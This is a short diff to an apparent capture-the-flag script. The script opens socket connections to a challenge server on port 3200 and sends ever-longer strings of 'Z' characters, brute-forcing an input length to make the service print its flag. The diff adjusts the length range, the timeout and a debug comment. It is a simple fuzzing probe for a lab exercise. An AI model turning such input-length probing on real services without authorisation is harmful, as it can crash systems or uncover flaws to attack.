@@ -5,8 +5,8 @@ PORT = 3200
 
 DAMN_FLAG = "Trying to print the damn flag!!! \n"
 LETTER = "Z"
-START = 100_100
-END = 101_000
+START = 95_000
+END = 100_000
 INCREMENT = 1
 
 data = b""
@@ -20,12 +20,12 @@ try:
     for n in range(START, END + 1, INCREMENT):
         attempts += 1
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(3)
+            s.settimeout(2)
             s.connect((HOST, PORT))
             spam = LETTER * (n - 1) + "\n"
             message = bytes(spam, "utf-8")
-            sent = s.send(message)  # for manual sanity check
-            # print(f"{sent=}")
+            sent = s.send(message)
+            # print(f"{sent=} {n=}")  # for manual sanity check
             try:
                 data = s.recv(1048576)
             except socket.timeout:
